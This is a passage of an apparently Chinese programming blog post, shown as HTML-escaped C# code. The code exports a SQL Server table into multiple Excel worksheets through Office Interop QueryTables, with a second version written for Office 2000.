/>\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(3, true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 3; i &lt; intSheetTotalSize; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheets.Add(m_objOpt, m_objSheets.get_Item(i), m_objOpt, m_objOpt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 2; i &lt;= m_objSheets.Count; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExportDataByQueryTable(i,true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void SaveExcelApp()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string excelFileName = string.Empty;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SaveFileDialog sf = new SaveFileDialog();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sf.Filter = &quot;*.xls|*.*&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sf.ShowDialog() == DialogResult.OK)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excelFileName = sf.FileName;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objBook.SaveAs(excelFileName, m_objOpt, m_objOpt, m_objOpt, m_objOpt, m_objOpt,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft.Office.Interop.Excel.XlSaveAsAccessMode.xlNoChange,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objOpt, m_objOpt, m_objOpt, m_objOpt, m_objOpt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void ExportDataByQueryTable(int intSheetNumber,bool blIsMoreThan)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string strQuery = string.Empty;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (blIsMoreThan)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strQuery = &quot;Select Top &quot; +<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.dbSheetSize + &quot; * From PD_WORKBIL_MST Where Not&nbsp; CMPID In (Select Top &quot; +<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dbSheetSize * (intSheetNumber-1) + &quot;&nbsp; CMPID From PD_WORKBIL_MST)&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strQuery = &quot;Select Top &quot; +this.dbSheetSize + &quot; * From PD_WORKBIL_MST &quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet = (Microsoft.Office.Interop.Excel._Worksheet)(m_objSheets.get_Item(intSheetNumber));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.get_Range(&quot;A1&quot;, m_objOpt).set_Value(m_objOpt, &quot;中文測試一&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.get_Range(&quot;B1&quot;, m_objOpt).set_Value(m_objOpt, &quot;中文測試二&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.get_Range(&quot;C1&quot;, m_objOpt).set_Value(m_objOpt, &quot;中文測試三&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.get_Range(&quot;D1&quot;, m_objOpt).set_Value(m_objOpt, &quot;中文測試四&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.get_Range(&quot;E1&quot;, m_objOpt).set_Value(m_objOpt, &quot;中文測試五&quot;);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objRange = m_objSheet.get_Range(&quot;A2&quot;, m_objOpt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable = m_objSheet.QueryTables.Add(&quot;OLEDB;Provider=SQLOLEDB.1;&quot; + strConnect, m_objRange, strQuery);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable.RefreshStyle = Microsoft.Office.Interop.Excel.XlCellInsertionMode.xlInsertEntireRows;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable.FieldNames = false;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objQryTable.Refresh(false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void button1_Click(object sender, EventArgs e)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; DeclareExcelApp();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SaveExcelApp();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n}<br />\r\n使用office2000的話﹐好像類庫有些不同﹐為給大家一個比較﹐也將源碼附貼如下﹕<br />\r\nusing System;<br />\r\nusing System.Collections.Generic;<br />\r\nusing System.ComponentModel;<br />\r\nusing System.Data;<br />\r\nusing System.Drawing;<br />\r\nusing System.Text;<br />\r\nusing System.Windows.Forms;</p>\r\n\r\n<p>namespace WindowsApplication2<br />\r\n{<br />\r\n&nbsp;&nbsp;&nbsp; public partial class Form1 : Form<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.Range m_objRange = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.Application m_objExcel = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.Workbooks m_objBooks = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel._Workbook m_objBook = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.Sheets m_objSheets = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel._Worksheet m_objSheet = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.QueryTable m_objQryTable = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; object m_objOpt = System.Reflection.Missing.Value;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //DataBase-used variable<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private System.Data.SqlClient.SqlConnection sqlConn = null;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private string strConnect = &quot;Data Source=192.168.168.253;Password = SHS;User ID=SHS;Initial Catalog=TEST_KM_ERP&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private System.Data.SqlClient.SqlCommand sqlCmd = null;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //Sheets variable<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private double dbSheetSize = 65535;//the hight limit number in one sheet<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int intSheetTotalSize = 0;//total record can divied sheet number<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private double dbTotalSize = 0;//record total number</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public Form1()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; InitializeComponent();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private int GetTotalSize()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlConn = new System.Data.SqlClient.SqlConnection(strConnect);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlCmd = new System.Data.SqlClient.SqlCommand(&quot;Select Count(*) From PD_WORKBIL_MST&quot;, sqlConn);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlConn.Open();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dbTotalSize = (int)sqlCmd.ExecuteScalar();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sqlConn.Close();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return (int)Math.Ceiling(dbTotalSize / this.dbSheetSize);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void DeclareExcelApp()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objExcel = new Excel.ApplicationClass();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objBooks = (Excel.Workbooks)m_objExcel.Workbooks;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objBook = (Excel._Workbook)(m_objBooks.Add(m_objOpt));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheets = (Excel.Sheets)m_objBook.Worksheets;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; intSheetTotalSize = GetTotalSize();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (intSheetTotalSize &lt;= 3)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (this.dbTotalSize &lt;= this.dbSheetSize)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if (this.dbTotalSize &lt;= this.dbSheetSize * 2)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(2, true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(2, true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.ExportDataByQueryTable(3, true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 3; i &lt; intSheetTotalSize; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheets.Add(m_objOpt, m_objSheets.get_Item(i), m_objOpt, m_objOpt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExportDataByQueryTable(1, false);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 2; i &lt;= m_objSheets.Count; i++)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ExportDataByQueryTable(i, true);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void SaveExcelApp()<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string excelFileName = string.Empty;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SaveFileDialog sf = new SaveFileDialog();<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sf.Filter = &quot;*.xls|*.*&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (sf.ShowDialog() == DialogResult.OK)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excelFileName = sf.FileName;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objBook.SaveAs(excelFileName, m_objOpt, m_objOpt, m_objOpt, m_objOpt, m_objOpt,<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Excel.XlSaveAsAccessMode.xlNoChange, m_objOpt, m_objOpt, m_objOpt, m_objOpt);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void ExportDataByQueryTable(int intSheetNumber, bool blIsMoreThan)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string strQuery = string.Empty;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (blIsMoreThan)<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strQuery = &quot;Select Top &quot; +<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.dbSheetSize + &quot; * From PD_WORKBIL_MST Where Not&nbsp; CMPID In (Select Top &quot; +<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dbSheetSize * (intSheetNumber-1) + &quot;&nbsp; CMPID From PD_WORKBIL_MST)&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strQuery = &quot;Select Top &quot; + this.dbSheetSize + &quot; * From PD_WORKBIL_MST &quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet = (Excel._Worksheet)(m_objSheets.get_Item(intSheetNumber));<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m_objSheet.Cells[1,1] = &quot;中文測試一&quot;;<br 